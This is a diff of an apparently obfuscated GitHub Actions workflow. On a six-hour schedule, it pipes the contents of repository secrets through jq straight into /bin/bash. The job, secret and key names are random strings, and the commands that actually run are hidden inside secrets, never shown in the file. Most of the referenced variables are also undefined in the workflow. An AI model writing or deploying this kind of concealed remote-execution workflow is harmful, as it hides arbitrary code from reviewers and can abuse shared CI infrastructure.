@@ -2,25 +2,20 @@ name: nightshirtchild
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
-
+    - cron: '0 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: nightshirtchild
         env:
-          s96: ${{ secrets.s96 }}
+          u42684: ${{ secrets.u42684 }}
         run: |
-          echo $s96 | jq -r .ukuhp01929 | /bin/bash
-          echo $mig5860 | jq -r .ykfp8 | /bin/bash
-          echo $dka6396 | jq -r .rtgo98 | /bin/bash
-          echo $bg47 | jq -r .o67 | /bin/bash
-          echo $f29 | jq -r .bdqo5356 | /bin/bash
-          echo $yf13769 | jq -r .qibsd9081 | /bin/bash
-          echo $hsw5567 | jq -r .he01357 | /bin/bash
-          echo $ucesb3899 | jq -r .vcv4 | /bin/bash
-          echo $ke62750 | jq -r .ysth7594 | /bin/bash
+          echo $u42684 | jq -r .wnovm6841 | /bin/bash
+          echo $anfkf009 | jq -r .ku87555 | /bin/bash
+          echo $dftm8 | jq -r .l4198 | /bin/bash
+          echo $hgbi3 | jq -r .afpue220 | /bin/bash
+          echo $pax5189 | jq -r .aqgks3116 | /bin/bash
+          echo $bfhag6277 | jq -r .jjd21069 | /bin/bash
 
